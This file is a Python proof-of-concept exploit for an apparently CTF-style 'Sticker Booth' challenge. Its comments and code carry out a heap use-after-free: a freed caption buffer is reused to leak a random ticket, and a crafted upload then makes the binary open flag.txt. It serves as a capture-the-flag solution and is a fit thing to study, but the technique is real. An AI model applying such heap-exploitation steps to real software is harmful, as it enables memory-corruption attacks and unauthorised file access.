#!/usr/bin/env python3
# Sticker Booth (FortiD 2026) local proof: two-phase exploit in ONE process.
#
# The booth_ticket (8 random bytes from /dev/urandom) is generated once at
# process start, so both phases must run in the same process:
#
# Phase 1 (leak the ticket):
#   photo p 2 1 <8 bytes>      blk0 (off 0,  size 24); mono row 1 lands on blk1
#   caption a AAA...A          blk1 D1 (off 24, size 32), refcount 2 (a and b)
#   caption b AAA...A          both items share the same buffer
#   mono p                     zeros D1[0..2]: refcount 0, data[2] = 0
#   remove a                   refcount 0, frees D1; b still points at D1 (UAF)
#   upload c 0000010020000000.. xalloc(32) reuses D1; data[2]=1, data[4]=0x20
#   builtin x heart            allocates blk2 right after D1 (ticket + path)
#   print b                    fwrite(D1+0x10, 1, 0x20), leaks blk2 head + ticket
#
# Phase 2 (file substitution) - sent after parsing the leaked ticket:
#   remove c                   data[0..1]==0, frees D1 again
#   upload d <payload>         payload = 00 00 02 01 08 00 00 00 ticket "flag.txt\0"
#   print b                    special path (type2 + valid ticket), open("flag.txt")
#
# Usage: python3 proof_sb.py [path-to-chall] [flagfile]
import os
import re
import select
import subprocess
import sys
import time

CHALL = sys.argv[1] if len(sys.argv) > 1 else './chall'

HEX8 = '0102030405060708'
TEXT = 'A' * 16
PAD = '00' * 24
HEAD = b'\x01\x00\x02\x01\x10\x00\x00\x00'  # blk2 head marker inside the leak
END_MARK = b'x: <3\n'                        # end of a print cycle


def read_until(f, marker, timeout=10):
    data = b''
    end = time.time() + timeout
    while marker not in data:
        if time.time() > end:
            break
        r, _, _ = select.select([f], [], [], 0.2)
        if r:
            chunk = os.read(f.fileno(), 65536)
            if not chunk:
                break
            data += chunk
    return data


def main():
    proc = subprocess.Popen([CHALL], stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout = proc.stdout

    # --- phase 1: leak the ticket ---
    r1 = (
        'photo p 2 1 ' + HEX8 + '\n'
        'caption a ' + TEXT + '\n'
        'caption b ' + TEXT + '\n'
        'mono p\n'
        'remove a\n'
        'upload c 0000010020000000' + PAD + '\n'
        'builtin x heart\n'
        'print\n'
    )
    proc.stdin.write(r1.encode())
    proc.stdin.flush()
    out1 = read_until(stdout, END_MARK)
    if HEAD not in out1:
        proc.kill()
        sys.exit('ticket leak pattern not found; output head: %r' % out1[:300])
    i = out1.find(HEAD)
    ticket = out1[i + len(HEAD):i + len(HEAD) + 8]
    print('ticket:', ticket.hex())

    # --- phase 2: rebuild the chunk with the real ticket and path ---
    payload_hex = '00000201' + '08000000' + ticket.hex() + '666c61672e747874' + '00' * 8
    r2 = (
        'remove c\n'
        'upload d ' + payload_hex + '\n'
        'print\n'
    )
    proc.stdin.write(r2.encode())
    proc.stdin.flush()
    out2 = read_until(stdout, END_MARK)
    proc.kill()

    flag = None
    m = re.search(rb'FortID\{[^}]*\}', out2)
    if m:
        flag = m.group(0).decode()
    print('flag found:', flag)
    print('RESULT: FILE SUBSTITUTION OK' if flag else 'RESULT: FAIL')
    if not flag:
        print('--- phase2 output (repr) ---')
        print(repr(out2[-300:]))


if __name__ == '__main__':
    main()